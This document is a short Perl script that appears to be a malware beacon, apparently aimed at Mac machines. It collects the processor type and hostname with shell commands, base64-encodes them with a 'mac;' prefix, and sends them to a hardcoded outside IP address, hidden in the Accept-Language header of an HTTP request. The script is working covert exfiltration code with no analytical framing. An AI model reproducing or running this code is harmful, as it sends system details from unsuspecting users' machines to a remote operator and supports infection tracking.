#!/usr/bin/perl
use IO::Socket;

sub encode_base64 ($;$)
{
    if ($] >= 5.006) {
	require bytes;
	if (bytes::length($_[0]) > length($_[0]) ||
	    ($] >= 5.008 && $_[0] =~ /[^\0-\xFF]/))
	{
	    require Carp;
	    Carp::croak("The Base64 encoding is only defined for bytes");
	}
    }

    use integer;

    my $eol = $_[1];
    $eol = "\n" unless defined $eol;

    my $res = pack("u", $_[0]);
    # Remove first character of each line, remove newlines
    $res =~ s/^.//mg;
    $res =~ s/\n//g;

    $res =~ tr|` -_|AA-Za-z0-9+/|;               # `# help emacs
    # fix padding at the end
    my $padding = (3 - length($_[0]) % 3) % 3;
    $res =~ s/.{$padding}$/'=' x $padding/e if $padding;
    # break encoded string into lines of no more than 76 characters each
    if (length $eol) {
	$res =~ s/(.{1,76})/$1$eol/g;
    }
    return $res;
}



my $server="64.28.188.220";
my $cmd=`uname -p;echo ";";hostname`;
$cmd=~s/\n//g;
my $uniqid=encode_base64("mac;".$cmd);
$uniqid=~s/\n//g;
my $request="GET / HTTP/1.1\r\nAccept-Language: $uniqid\r\nHost: $server\r\n\r\n";

my $socket=IO::Socket::INET->new(PeerAddr=>$server,PeerPort=>80,Proto=>"tcp",timeout=>10) or die();
print $socket $request;
close($socket);
